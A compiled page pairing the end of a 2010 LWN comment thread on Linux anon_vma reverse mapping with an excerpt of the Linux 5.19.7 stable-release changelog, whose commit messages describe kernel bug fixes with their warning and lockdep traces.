Hmm... I dunno, I would have thought that this isn't so much only needed for anonymous memory, but this may be the only reason why it's needed for anonymous memory, iyswim... that in other uses there are other reasons for it too, and so it can actually be simpler to just have it, than have it in some places and not in others. Anywhere you have copy-on-write pages it's going to be important, as the way you achieve that is to mark the pages read only. Someone tried to write to it, it causes a memory protection fault, which jumps into the VM code giving it the address of memory that the fault occured while trying to write. So where do you start if you don't have a back link to get from that address to the structures belonging to those using the page? You'd end up just doing loads of searching instead. The same goes for when it's something like memory mapped files, you need to know when the pages have been modified so you know it has to at some point be written back to disk. If you can't look up what's going on from the address it's going on at, things get way more complicated. Seems this is just basic accounting :-/

### The case of the overly anonymous anon\_vma

Posted May 1, 2010 12:17 UTC (Sat)
by **i3839** (guest, #31386)
[[Link](/Articles/385722/)] (1 responses)

It is. Reverse mapping for file backed pages doesn't need anon\_vma stuff, it's a lot simpler.

You don't need a reverse mapping to do COW, when you get a pagefault you know the virtual address which caused it.

Reverse mapping is needed to find all virtual pages belonging to a certain physical one. That isn't needed often for anonymous memory.

### The case of the overly anonymous anon\_vma

Posted May 3, 2010 16:51 UTC (Mon)
by **efexis** (guest, #26355)
[[Link](/Articles/385910/)]

You're right about the page fault bit, my mistake, a reference count would be sufficient there, the reverse map would be for changing the backing for purposes of swap or migration in a NUMA or HIGHMEM system where quick knowledge page<-->active sets is required.

Reverse mapping for file backed pages don't need anon\_vma stuff obviously, because they're not anon. What they use isn't simpler though, as, for example, a library will often be shared by more address spaces than an anon page, it makes more sense to use a search tree (at least this used to be the case, according to a slightly dated early 2.6.x book detailing it. If it's now simpler than this, that would show kernel devs in fact simplifying things, not adding complexity).

If you use none of these, go into your kernel conf and disable CONFIG\_SWAP, CONFIG\_NUMA and any CONFIG\_HIGHMEM entries. If nothing else uses it, it'll either be removed, or worst case, a few greps will show you where the functions are being used elsewhere to throw a few #ifdef's around (I imagine embedded comunity would have interest in already doing this).

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 21:15 UTC (Sat)
by **efexis** (guest, #26355)
[[Link](/Articles/384640/)]

Fantastic. That last diagram is like a punchline, I wasn't completely with it until that last one which triggered what I refer to as a "cascade of realisation", which is like a nice brain massage :-) much appreciated.

Not so appreciated though was the pointing to a 2004 article that I remember reading like it was just erm... 200err... 2007? Way to make me feel old for the first time ever ;-p

Copyright © 2010, Eklektix, Inc.

This article may be redistributed under the terms of the
[Creative
Commons CC BY-SA 4.0](http://creativecommons.org/licenses/by-sa/4.0/) license

Comments and public postings are copyrighted by their creators.

Linux is a registered trademark of Linus Torvalds



=== Content from cdn.kernel.org_b032198a_20250115_101102.html ===
commit 7d0a458e1963128ee5a85bf0584bea5e75149946
Author: Greg Kroah-Hartman
Date: Mon Sep 5 10:31:36 2022 +0200
Linux 5.19.7
Link: https://lore.kernel.org/r/20220902121404.772492078@linuxfoundation.org
Tested-by: Ronald Warsow
Tested-by: Florian Fainelli
Tested-by: Shuah Khan
Tested-by: Ron Economos
Tested-by: Guenter Roeck
Tested-by: Linux Kernel Functional Testing
Tested-by: Rudi Heitbaum
Tested-by: Bagas Sanjaya
Tested-by: Sudip Mukherjee
Tested-by: Justin M. Forbes
Signed-off-by: Greg Kroah-Hartman
commit a754ee1c66bd0a23e613f0bf865053b29cb90e16
Author: Sudeep Holla
Date: Mon Aug 8 09:46:40 2022 +0100
arm64: cacheinfo: Fix incorrect assignment of signed error value to unsigned fw\_level
commit e75d18cecbb3805895d8ed64da4f78575ec96043 upstream.
Though acpi\_find\_last\_cache\_level() always returned signed value and the
document states it will return any errors caused by lack of a PPTT table,
it never returned negative values before.
Commit 0c80f9e165f8 ("ACPI: PPTT: Leave the table mapped for the runtime usage")
however changed it by returning -ENOENT if no PPTT was found. The value
returned from acpi\_find\_last\_cache\_level() is then assigned to unsigned
fw\_level.
It will result in the number of cache leaves calculated incorrectly as
a huge value which will then cause the following warning from \_\_alloc\_pages
as the order would be great than MAX\_ORDER because of incorrect and huge
cache leaves value.
| WARNING: CPU: 0 PID: 1 at mm/page\_alloc.c:5407 \_\_alloc\_pages+0x74/0x314
| Modules linked in:
| CPU: 0 PID: 1 Comm: swapper/0 Not tainted 5.19.0-10393-g7c2a8d3ac4c0 #73
| pstate: 20000005 (nzCv daif -PAN -UAO -TCO -DIT -SSBS BTYPE=--)
| pc : \_\_alloc\_pages+0x74/0x314
| lr : alloc\_pages+0xe8/0x318
| Call trace:
| \_\_alloc\_pages+0x74/0x314
| alloc\_pages+0xe8/0x318
| kmalloc\_order\_trace+0x68/0x1dc
| \_\_kmalloc+0x240/0x338
| detect\_cache\_attributes+0xe0/0x56c
| update\_siblings\_masks+0x38/0x284
| store\_cpu\_topology+0x78/0x84
| smp\_prepare\_cpus+0x48/0x134
| kernel\_init\_freeable+0xc4/0x14c
| kernel\_init+0x2c/0x1b4
| ret\_from\_fork+0x10/0x20
Fix the same by changing fw\_level to be signed integer and return the
error from init\_cache\_level() early in case of error.
Reported-and-Tested-by: Bruno Goncalves
Signed-off-by: Sudeep Holla
Link: https://lore.kernel.org/r/20220808084640.3165368-1-sudeep.holla@arm.com
Signed-off-by: Will Deacon
Signed-off-by: Greg Kroah-Hartman
commit 123bf15c1a15f8dc7b5aceb5186bed37f2e80af5
Author: Yang Yingliang
Date: Mon Aug 22 10:53:46 2022 +0800
net: neigh: don't call kfree\_skb() under spin\_lock\_irqsave()
commit d5485d9dd24e1d04e5509916515260186eb1455c upstream.
It is not allowed to call kfree\_skb() from hardware interrupt
context or with interrupts being disabled. So add all skb to
a tmp list, then free them after spin\_unlock\_irqrestore() at
once.
Fixes: 66ba215cb513 ("neigh: fix possible DoS due to net iface start/stop loop")
Suggested-by: Denis V. Lunev
Signed-off-by: Yang Yingliang
Reviewed-by: Nikolay Aleksandrov
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit ec274d8f1e649b12530bbba3f01478e20bf8bc23
Author: Zhengchao Shao
Date: Wed Jul 27 17:33:12 2022 +0800
net/af\_packet: check len when min\_header\_len equals to 0
commit dc633700f00f726e027846a318c5ffeb8deaaeda upstream.
User can use AF\_PACKET socket to send packets with the length of 0.
When min\_header\_len equals to 0, packet\_snd will call \_\_dev\_queue\_xmit
to send packets, and sock->type can be any type.
Reported-by: syzbot+5ea725c25d06fb9114c4@syzkaller.appspotmail.com
Fixes: fd1894224407 ("bpf: Don't redirect packets with invalid pkt\_len")
Signed-off-by: Zhengchao Shao
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit d25d6744c46b8289d61180bafb30f3140fef24a4
Author: Liam Howlett
Date: Mon Jun 27 15:18:59 2022 +0000
android: binder: fix lockdep check on clearing vma
commit b0cab80ecd54ae3b2356bb081af0bffd538c8265 upstream.
When munmapping a vma, the mmap\_lock can be degraded to a write before
calling close() on the file handle. The binder close() function calls
binder\_alloc\_set\_vma() to clear the vma address, which now has a lock dep
check for writing on the mmap\_lock. Change the lockdep check to ensure
the reading lock is held while clearing and keep the write check while
writing.
Link: https://lkml.kernel.org/r/20220627151857.2316964-1-Liam.Howlett@oracle.com
Fixes: 472a68df605b ("android: binder: stop saving a pointer to the VMA")
Signed-off-by: Liam R. Howlett
Reported-by: syzbot+da54fa8d793ca89c741f@syzkaller.appspotmail.com
Acked-by: Todd Kjos
Cc: "Arve Hjønnevåg"
Cc: Christian Brauner (Microsoft)
Cc: Greg Kroah-Hartman
Cc: Hridya Valsaraju
Cc: Joel Fernandes
Cc: Martijn Coenen
Cc: Suren Baghdasaryan
Signed-off-by: Andrew Morton
Signed-off-by: Greg Kroah-Hartman
commit 8a239dd886e25d03bb2581c8ab30e8a1a12446b1
Author: Josef Bacik
Date: Wed Aug 3 14:28:47 2022 -0400
btrfs: tree-checker: check for overlapping extent items
[ Upstream commit 899b7f69f244e539ea5df1b4d756046337de44a5 ]
We're seeing a weird problem in production where we have overlapping
extent items in the extent tree. It's unclear where these are coming
from, and in debugging we realized there's no check in the tree checker
for this sort of problem. Add a check to the tree-checker to make sure
that the extents do not overlap each other.
Reviewed-by: Qu Wenruo
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Sasha Levin
commit b83e1567af28055b9a0bb7b10fcdd58b02d00954
Author: Josef Bacik
Date: Tue Jul 26 16:24:04 2022 -0400
btrfs: fix lockdep splat with reloc root extent buffers
[ Upstream commit b40130b23ca4a08c5785d5a3559805916bddba3c ]
We have been hitting the following lockdep splat with btrfs/187 recently
WARNING: possible circular locking dependency detected
5.19.0-rc8+ #775 Not tainted
------------------------------------------------------
btrfs/752500 is trying to acquire lock:
ffff97e1875a97b8 (btrfs-treloc-02#2){+.+.}-{3:3}, at: \_\_btrfs\_tree\_lock+0x24/0x110
but task is already holding lock:
ffff97e1875a9278 (btrfs-tree-01/1){+.+.}-{3:3}, at: \_\_btrfs\_tree\_lock+0x24/0x110
which lock already depends on the new lock.
the existing dependency chain (in reverse order) is:
-> #2 (btrfs-tree-01/1){+.+.}-{3:3}:
down\_write\_nested+0x41/0x80
\_\_btrfs\_tree\_lock+0x24/0x110
btrfs\_init\_new\_buffer+0x7d/0x2c0
btrfs\_alloc\_tree\_block+0x120/0x3b0
\_\_btrfs\_cow\_block+0x136/0x600
btrfs\_cow\_block+0x10b/0x230
btrfs\_search\_slot+0x53b/0xb70
btrfs\_lookup\_inode+0x2a/0xa0
\_\_btrfs\_update\_delayed\_inode+0x5f/0x280
btrfs\_async\_run\_delayed\_root+0x24c/0x290
btrfs\_work\_helper+0xf2/0x3e0
process\_one\_work+0x271/0x590
worker\_thread+0x52/0x3b0
kthread+0xf0/0x120
ret\_from\_fork+0x1f/0x30
-> #1 (btrfs-tree-01){++++}-{3:3}:
down\_write\_nested+0x41/0x80
\_\_btrfs\_tree\_lock+0x24/0x110
btrfs\_search\_slot+0x3c3/0xb70
do\_relocation+0x10c/0x6b0
relocate\_tree\_blocks+0x317/0x6d0
relocate\_block\_group+0x1f1/0x560
btrfs\_relocate\_block\_group+0x23e/0x400
btrfs\_relocate\_chunk+0x4c/0x140
btrfs\_balance+0x755/0xe40
btrfs\_ioctl+0x1ea2/0x2c90
\_\_x64\_sys\_ioctl+0x88/0xc0
do\_syscall\_64+0x38/0x90
entry\_SYSCALL\_64\_after\_hwframe+0x63/0xcd
-> #0 (btrfs-treloc-02#2){+.+.}-{3:3}:
\_\_lock\_acquire+0x1122/0x1e10
lock\_acquire+0xc2/0x2d0
down\_write\_nested+0x41/0x80
\_\_btrfs\_tree\_lock+0x24/0x110
btrfs\_lock\_root\_node+0x31/0x50
btrfs\_search\_slot+0x1cb/0xb70
replace\_path+0x541/0x9f0
merge\_reloc\_root+0x1d6/0x610
merge\_reloc\_roots+0xe2/0x260
relocate\_block\_group+0x2c8/0x560
btrfs\_relocate\_block\_group+0x23e/0x400
btrfs\_relocate\_chunk+0x4c/0x140
btrfs\_balance+0x755/0xe40
btrfs\_ioctl+0x1ea2/0x2c90
\_\_x64\_sys\_ioctl+0x88/0xc0
do\_syscall\_64+0x38/0x90
entry\_SYSCALL\_64\_after\_hwframe+0x63/0xcd
other info that might help us debug this:
Chain exists of:
btrfs-treloc-02#2 --> btrfs-tree-01 --> btrfs-tree-01/1
Possible unsafe locking scenario:
CPU0 CPU1
---- ----
lock(btrfs-tree-01/1);
lock(btrfs-tree-01);
lock(btrfs-tree-01/1);
lock(btrfs-treloc-02#2);
\*\*\* DEADLOCK \*\*\*
7 locks held by btrfs/752500:
#0: ffff97e292fdf460 (sb\_writers#12){.+.+}-{0:0}, at: btrfs\_ioctl+0x208/0x2c90
#1: ffff97e284c02050 (&fs\_info->reclaim\_bgs\_lock){+.+.}-{3:3}, at: btrfs\_balance+0x55f/0xe40
#2: ffff97e284c00878 (&fs\_info->cleaner\_mutex){+.+.}-{3:3}, at: btrfs\_relocate\_block\_group+0x236/0x400
#3: ffff97e292fdf650 (sb\_internal#2){.+.+}-{0:0}, at: merge\_reloc\_root+0xef/0x610
#4: ffff97e284c02378 (btrfs\_trans\_num\_writers){++++}-{0:0}, at: join\_transaction+0x1a8/0x5a0
#5: ffff97e284c023a0 (btrfs\_trans\_num\_extwriters){++++}-{0:0}, at: join\_transaction+0x1a8/0x5a0
#6: ffff97e1875a9278 (btrfs-tree-01/1){+.+.}-{3:3}, at: \_\_btrfs\_tree\_lock+0x24/0x110
stack backtrace:
CPU: 1 PID: 752500 Comm: btrfs Not tainted 5.19.0-rc8+ #775
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
Call Trace:
dump\_stack\_lvl+0x56/0x73
check\_noncircular+0xd6/0x100
? lock\_is\_held\_type+0xe2/0x140
\_\_lock\_acquire+0x1122/0x1e10
lock\_acquire+0xc2/0x2d0
? \_\_btrfs\_tree\_lock+0x24/0x110
down\_write\_nested+0x41/0x80
? \_\_btrfs\_tree\_lock+0x24/0x110
\_\_btrfs\_tree\_lock+0x24/0x110
btrfs\_lock\_root\_node+0x31/0x50
btrfs\_search\_slot+0x1cb/0xb70
? lock\_release+0x137/0x2d0
? \_raw\_spin\_unlock+0x29/0x50
? release\_extent\_buffer+0x128/0x180
replace\_path+0x541/0x9f0
merge\_reloc\_root+0x1d6/0x610
merge\_reloc\_roots+0xe2/0x260
relocate\_block\_group+0x2c8/0x560
btrfs\_relocate\_block\_group+0x23e/0x400
btrfs\_relocate\_chunk+0x4c/0x140
btrfs\_balance+0x755/0xe40
btrfs\_ioctl+0x1ea2/0x2c90
? lock\_is\_held\_type+0xe2/0x140
? lock\_is\_held\_type+0xe2/0x140
? \_\_x64\_sys\_ioctl+0x88/0xc0
\_\_x64\_sys\_ioctl+0x88/0xc0
do\_syscall\_64+0x38/0x90
entry\_SYSCALL\_64\_after\_hwframe+0x63/0xcd
This isn't necessarily new, it's just tricky to hit in practice. There
are two competing things going on here. With relocation we create a
snapshot of every fs tree with a reloc tree. Any extent buffers that
get initialized here are initialized with the reloc root lockdep key.
However since it is a snapshot, any blocks that are currently in cache
that originally belonged to the fs tree will have the normal tree
lockdep key set. This creates the lock dependency of
reloc tree -> normal tree
for the extent buffer locking during the first phase of the relocation
as we walk down the reloc root to relocate blocks.
However this is problematic because the final phase of the relocation is
merging the reloc root into the original fs root. This involves
searching down to any keys that exist in the original fs root and then
swapping the relocated block and the original fs root block. We have to
search down to the fs root first, and then go search the reloc root for
the block we need to replace. This creates the dependency of
normal tree -> reloc tree
which is why lockdep complains.
Additionally even if we were to fix this particular mismatch with a
different nesting for the merge case, we're still slotting in a block
that has a owner of the reloc root objectid into a normal tree, so that
block will have its lockdep key set to the tree reloc root, and create a
lockdep splat later on when we wander into that block from the fs root.
Unfortunately the only solution here is to make sure we do not set the
lockdep key to the reloc tree lockdep key normally, and then reset any
blocks we wander into from the reloc root when we're doing the merged.
This solves the problem of having mixed tree reloc keys intermixed with
normal tree keys, and then allows us to make sure in the merge case we
maintain the lock order of
normal tree -> reloc tree
We handle this by setting a bit on the reloc root when we do the search
for the block we want to relocate, and any block we search into or COW
at that point gets set to the reloc tree key. This works correctly
because we only ever COW down to the parent node, so we aren't resetting
the key for the block we're linking into the fs root.
With this patch we no longer have the lockdep splat in btrfs/187.
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Sasha Levin
commit 98f803acf8ac18a1cc159473137d563db4df0aa8
Author: Josef Bacik
Date: Tue Jul 26 16:24:03 2022 -0400
btrfs: move lockdep class helpers to locking.c
[ Upstream commit 0a27a0474d146eb79e09ec88bf0d4229f4cfc1b8 ]
These definitions exist in disk-io.c, which is not related to the
locking. Move this over to locking.h/c where it makes more sense.
Reviewed-by: Johannes Thumshirn
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Sasha Levin
commit 82af833b99dc51c8795d171dfd376b451506544a
Author: Stefan Binding
Date: Tue Aug 16 16:19:01 2022 +0100
ALSA: hda/cs8409: Support new Dolphin Variants
[ Upstream commit 1ff954f9ab054675b9eb02dd14add8f7aa376d71 ]
Add 4 new Dolphin Systems, same configuration as older systems.
Signed-off-by: Stefan Binding
Link: https://lore.kernel.org/r/20220816151901.1398007-1-sbinding@opensource.cirrus.com
Signed-off-by: Takashi Iwai
Signed-off-by: Sasha Levin
commit 0f31a350fd9a7c750bcde02f92eec3293b6bb667
Author: Lucas Tanure
Date: Wed Jul 27 10:59:24 2022 +0100
platform/x86: serial-multi-instantiate: Add CLSA0101 Laptop
[ Upstream commit 88392a0dd0ab263edb4ca416ebdecabd8289158a ]
The device CLSA0101 has two instances of CS35L41
connected by I2C.
Signed-off-by: Lucas Tanure
Link: https://lore.kernel.org/r/20220727095924.80884-5-tanureal@opensource.cirrus.com
Link: https://lore.kernel.org/r/20220816194639.13870-1-cam@neo-zeon.de
Signed-off-by: Takashi Iwai
Signed-off-by: Sasha Levin
commit 503728838bdf9b8fd50ff1f89d47668e922880aa
Author: Florian Westphal
Date: Tue Aug 16 14:15:21 2022 +0200
testing: selftests: nft\_flowtable.sh: use random netns names
[ Upstream commit b71b7bfeac38c7a21c423ddafb29aa6258949df8 ]
"ns1" is a too generic name, use a random suffix to avoid
errors when such a netns exists. Also allows to run multiple
instances of the script in parallel.
Signed-off-by: Florian Westphal
Signed-off-by: Sasha Levin
commit 7d4bfe34b9cbb0395cb9508fa64324d4a1379e00
Author: Geert Uytterhoeven
Date: Mon Aug 15 12:39:20 2022 +0200
netfilter: conntrack: NF\_CONNTRACK\_PROCFS should no longer default to y
[ Upstream commit aa5762c34213aba7a72dc58e70601370805fa794 ]
NF\_CONNTRACK\_PROCFS was marked obsolete in commit 54b07dca68557b09
("netfilter: provide config option to disable ancient procfs parts") in
v3.3.
Signed-off-by: Geert Uytterhoeven
Signed-off-by: Florian Westphal
Signed-off-by: Sasha Levin
commit 933020e6d0572f9997e8faaed8c082fda0825718
Author: Mukul Joshi
Date: Fri Aug 12 15:23:51 2022 -0400
drm/amdgpu: Fix interrupt handling on ih\_soft ring
[ Upstream commit de8341ee3ce7316883e836a2c4e9bf01ab651e0f ]
There are no backing hardware registers for ih\_soft ring.
As a result, don't try to access hardware registers for read
and write pointers when processing interrupts on the IH soft
ring.
Signed-off-by: Mukul Joshi
Acked-by: Christian König
Reviewed-by: Felix Kuehling
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 09186eeffd3949a7e6ed39085bc151c1396a99a8
Author: Shane Xiao
Date: Mon Aug 15 16:32:15 2022 +0800
drm/amdgpu: Add secure display TA load for Renoir
[ Upstream commit e42dfa66d59240afbdd8d4b47b87486db39504aa ]
Add secure display TA load for Renoir
Signed-off-by: Shane Xiao
Reviewed-by: Aaron Liu
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit d278f332d105d3340179965dc14d6f7157fb9450
Author: Harish Kasiviswanathan
Date: Fri Aug 5 18:04:08 2022 -0400
drm/amdgpu: Add decode\_iv\_ts helper for ih\_v6 block
[ Upstream commit 1af9add1f1512b10d9ce44ec7137612bc81ff069 ]
Was missing. Add it.
Signed-off-by: Harish Kasiviswanathan
Reviewed-by: Hawking Zhang
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 4eb2be1d0827627b5878b26dfa21d68ffe677fd0
Author: Charlene Liu
Date: Fri Aug 5 12:59:47 2022 -0400
drm/amd/display: avoid doing vm\_init multiple time
[ Upstream commit 5544a7b5a07480192eb5fd3536462faed2c21528 ]
[why]
this is to ensure that driver will not reprogram hvm\_prefetch\_req again if
it is done.
Reviewed-by: Martin Leung
Acked-by: Brian Chang
Signed-off-by: Charlene Liu
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit bd71ef2c30244c25243d84b593ea0ba88164ebb6
Author: Tom Chung
Date: Wed Aug 3 15:15:17 2022 +0800
drm/amd/display: Fix plug/unplug external monitor will hang while playback MPO video
[ Upstream commit e98459c06e3d45c2229b097f7b8cdd412357fa2f ]
[Why]
Pipes for MPO primary and overlay will be power down and power up during
plug/unplug external monitor while MPO video playback.
But the pipes were the same after plug/unplug and should not need to be
power down and power up or it will make page flip interrupt disabled and
cause hang issue.
[How]
Add pipe split change condition that not only check the top pipe pointer
but also check the index of top pipe if both top pipes are available.
Reviewed-by: Sun peng Li
Acked-by: Brian Chang
Signed-off-by: Tom Chung
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit db1d9deb84d7870486688a5d13602962443a5500
Author: Dusica Milinkovic
Date: Wed Aug 10 09:43:15 2022 +0200
drm/amdgpu: Increase tlb flush timeout for sriov
[ Upstream commit 373008bfc9cdb0f050258947fa5a095f0657e1bc ]
[Why]
During multi-vf executing benchmark (Luxmark) observed kiq error timeout.
It happenes because all of VFs do the tlb invalidation at the same time.
Although each VF has the invalidate register set, from hardware side
the invalidate requests are queue to execute.
[How]
In case of 12 VF increase timeout on 12\*100ms
Signed-off-by: Dusica Milinkovic
Acked-by: Shaoyun Liu
Acked-by: Alex Deucher
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit db0669c9731b849dee3dcaa6a0b4a891a0055338
Author: Ilya Bakoulin
Date: Tue Jul 26 16:19:38 2022 -0400
drm/amd/display: Fix pixel clock programming
[ Upstream commit 04fb918bf421b299feaee1006e82921d7d381f18 ]
[Why]
Some pixel clock values could cause HDMI TMDS SSCPs to be misaligned
between different HDMI lanes when using YCbCr420 10-bit pixel format.
BIOS functions for transmitter/encoder control take pixel clock in kHz
increments, whereas the function for setting the pixel clock is in 100Hz
increments. Setting pixel clock to a value that is not on a kHz boundary
will cause the issue.
[How]
Round pixel clock down to nearest kHz in 10/12-bpc cases.
Reviewed-by: Aric Cyr
Acked-by: Brian Chang
Signed-off-by: Ilya Bakoulin
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 22a75c616f1971c23838506b14971a4ef4a66bd7
Author: Evan Quan
Date: Wed Aug 10 11:11:16 2022 +0800
drm/amd/pm: add missing ->fini\_xxxx interfaces for some SMU13 asics
[ Upstream commit 4bac1c846eff8042dd59ddecd0a43f3b9de5fd23 ]
Without these, potential memory leak may be induced.
Signed-off-by: Evan Quan
Reviewed-by: Alex Deucher
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 4d21584ac6392aa66171b7efd647ecd1a447556b
Author: Evan Quan
Date: Wed Aug 10 11:08:31 2022 +0800
drm/amd/pm: add missing ->fini\_microcode interface for Sienna Cichlid
[ Upstream commit 0a2d922a5618377cdf8fa476351362733ef55342 ]
To avoid any potential memory leak.
Signed-off-by: Evan Quan
Reviewed-by: Alex Deucher
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit d9d70547cba1d88fe52bfb37655d09a12926a0f3
Author: Evan Quan
Date: Wed Aug 3 16:13:56 2022 +0800
drm/amdgpu: disable 3DCGCG/CGLS temporarily due to stability issue
[ Upstream commit 1b586595df6d04c27088ef348b8202204ce26d45 ]
Some stability issues were reported with these features.
Signed-off-by: Evan Quan
Reviewed-by: Alex Deucher
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit dc441eda061720bab0117c45e30a2eb065b858ec
Author: Namjae Jeon
Date: Sun Aug 14 22:40:25 2022 +0900
ksmbd: don't remove dos attribute xattr on O\_TRUNC open
[ Upstream commit 17661ecf6a64eb11ae7f1108fe88686388b2acd5 ]
When smb client open file in ksmbd share with O\_TRUNC, dos attribute
xattr is removed as well as data in file. This cause the FSCTL\_SET\_SPARSE
request from the client fails because ksmbd can't update the dos attribute
after setting ATTR\_SPARSE\_FILE. And this patch fix xfstests generic/469
test also.
Signed-off-by: Namjae Jeon
Reviewed-by: Hyunchul Lee
Signed-off-by: Steve French
Signed-off-by: Sasha Levin
commit 895096784ab9eb17126e3099a6ef2649e96f8d84
Author: Juergen Gross
Date: Mon Jun 20 11:45:34 2022 +0200
s390/hypfs: avoid error message under KVM
[ Upstream commit 7b6670b03641ac308aaa6fa2e6f964ac993b5ea3 ]
When booting under KVM the following error messages are issued:
hypfs.7f5705: The hardware system does not support hypfs
hypfs.7a79f0: Initialization of hypfs failed with rc=-61
Demote the severity of first message from "error" to "info" and issue
the second message only in other error cases.
Signed-off-by: Juergen Gross
Acked-by: Heiko Carstens
Acked-by: Christian Borntraeger
Link: https://lore.kernel.org/r/20220620094534.18967-1-jgross@suse.com
[arch/s390/hypfs/hypfs\_diag.c changed description]
Signed-off-by: Alexander Gordeev
Signed-off-by: Sasha Levin
commit 2432f152c175c149b6365b07d110701ca1df988e
Author: Stefan Binding
Date: Mon Aug 15 15:19:53 2022 +0100
ALSA: hda/realtek: Add quirks for ASUS Zenbooks using CS35L41
[ Upstream commit 461122b999bda2ebef2086a35d8990f9ccac5ab8 ]
These Asus Zenbook laptop use Realtek HDA codec combined with
2xCS35L41 Amplifiers using SPI.
Signed-off-by: Stefan Binding
Link: https://lore.kernel.org/r/20220815141953.25197-1-sbinding@opensource.cirrus.com
Signed-off-by: Takashi Iwai
Signed-off-by: Sasha Levin
commit 2dd5ed474115150d8175825bc3b56c6385c3a83b
Author: Denis V. Lunev
Date: Thu Aug 11 18:20:11 2022 +0300
neigh: fix possible DoS due to net iface start/stop loop
[ Upstream commit 66ba215cb51323e4e55e38fd5f250e0fae0cbc94 ]
Normal processing of ARP request (usually this is Ethernet broadcast
packet) coming to the host is looking like the following:
\* the packet comes to arp\_process() call and is passed through routing
procedure
\* the request is put into the queue using pneigh\_enqueue() if
corresponding ARP record is not local (common case for container
records on the host)
\* the request is processed by timer (within 80 jiffies by default) and
ARP reply is sent from the same arp\_process() using
NEIGH\_CB(skb)->flags & LOCALLY\_ENQUEUED condition (flag is set inside
pneigh\_enqueue())
And here the problem comes. Linux kernel calls pneigh\_queue\_purge()
which destroys the whole queue of ARP requests on ANY network interface
start/stop event through \_\_neigh\_ifdown().
This is actually not a problem within the original world as network
interface start/stop was accessible to the host 'root' only, which
could do more destructive things. But the world is changed and there
are Linux containers available. Here container 'root' has an access
to this API and could be considered as untrusted user in the hosting
(container's) world.
Thus there is an attack vector to other containers on node when
container's root will endlessly start/stop interfaces. We have observed
similar situation on a real production node when docker container was
doing such activity and thus other containers on the node become not
accessible.
The patch proposed doing very simple thing. It drops only packets from
the same namespace in the pneigh\_queue\_purge() where network interface
state change is detected. This is enough to prevent the problem for the
whole node preserving original semantics of the code.
v2:
- do del\_timer\_sync() if queue is empty after pneigh\_queue\_purge()
v3:
- rebase to net tree
Cc: "David S. Miller"
Cc: Eric Dumazet
Cc: Jakub Kicinski
Cc: Paolo Abeni
Cc: Daniel Borkmann
Cc: David Ahern
Cc: Yajun Deng
Cc: Roopa Prabhu
Cc: Christian Brauner
Cc: netdev@vger.kernel.org
Cc: linux-kernel@vger.kernel.org
Cc: Alexey Kuznetsov
Cc: Alexander Mikhalitsyn
Cc: Konstantin Khorenko
Cc: kernel@openvz.org
Cc: devel@openvz.org
Investigated-by: Alexander Mikhalitsyn
Signed-off-by: Denis V. Lunev
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 0d462a681d7d98ecb1b48605f6625802acd85d31
Author: Li Qiong
Date: Fri Aug 12 11:09:54 2022 +0800
net: lan966x: fix checking for return value of platform\_get\_irq\_byname()
[ Upstream commit 40b4ac880e21d917da7f3752332fa57564a4c202 ]
The platform\_get\_irq\_byname() returns non-zero IRQ number
or negative error number. "if (irq)" always true, chang it
to "if (irq > 0)"
Signed-off-by: Li Qiong
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 40f424dc1ee328832ec86df29b8939e2e1618153
Author: Namjae Jeon
Date: Mon Aug 8 21:56:48 2022 +0900
ksmbd: return STATUS\_BAD\_NETWORK\_NAME error status if share is not configured
[ Upstream commit fe54833dc8d97ef387e86f7c80537d51c503ca75 ]
If share is not configured in smb.conf, smb2 tree connect should return
STATUS\_BAD\_NETWORK\_NAME instead of STATUS\_BAD\_NETWORK\_PATH.
Signed-off-by: Namjae Jeon
Reviewed-by: Hyunchul Lee
Signed-off-by: Steve French
Signed-off-by: Sasha Levin
commit 4b25bdb54578f3b96ff055e5d27bc1cb82950e51
Author: Zhen Ni
Date: Wed Aug 3 17:19:58 2022 +0800
drm/amd/pm: Fix a potential gpu\_metrics\_table memory leak
[ Upstream commit 5afb76522a0af0513b6dc01f84128a73206b051b ]
Memory is allocated for gpu\_metrics\_table in
smu\_v13\_0\_4\_init\_smc\_tables(), but not freed in
smu\_v13\_0\_4\_fini\_smc\_tables(). This may cause memory leaks, fix it.
Reviewed-by: Evan Quan
Signed-off-by: Zhen Ni
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 21e3891abc83f2d5482c67cca2fb7f228635daaf
Author: Felix Kuehling
Date: Thu Aug 4 18:19:38 2022 -0400
drm/amdkfd: Handle restart of kfd\_ioctl\_wait\_events
[ Upstream commit bea9a56afbc4b5a41ea579b8b0dc5e189b439504 ]
When kfd\_ioctl\_wait\_events needs to restart due to a signal, we need to
update the timeout to account for the time already elapsed. We also need
to undo auto\_reset of events that have signaled already, so that the
restarted ioctl will be able to count those signals again.
This fixes infinite hangs when kfd\_ioctl\_wait\_events is interrupted by a
signal.
Signed-off-by: Felix Kuehling
Reviewed-and-tested-by: Xiaogang Chen
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 952d4c72d9032eec5c38249ca353d31c43be06e0
Author: Kenneth Feng
Date: Tue Aug 9 10:13:54 2022 +0800
drm/amd/pm: skip pptable override for smu\_v13\_0\_7
[ Upstream commit 4e64b529c5b04e7944b41de554ee686ecab00744 ]
skip pptable override for smu\_v13\_0\_7 secure boards only.
